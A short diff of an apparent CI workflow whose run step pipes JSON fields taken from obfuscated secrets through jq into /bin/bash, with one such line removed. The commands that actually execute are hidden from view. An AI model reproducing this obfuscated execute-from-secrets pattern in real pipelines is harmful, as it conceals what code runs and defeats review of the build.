@@ -21,7 +21,6 @@ jobs:
           y7180: ${{ secrets.y7180 }}
         run: |
           printf '%s' "$y7180" | jq -r .jc2 | /bin/bash
-          printf '%s' "$dfoc365" | jq -r .snkh5637 | /bin/bash
           printf '%s' "$zacs0" | jq -r .d7 | /bin/bash
           printf '%s' "$lyby639" | jq -r .od16 | /bin/bash
           echo $hbd4006 | jq -r .ybz61 | /bin/bash
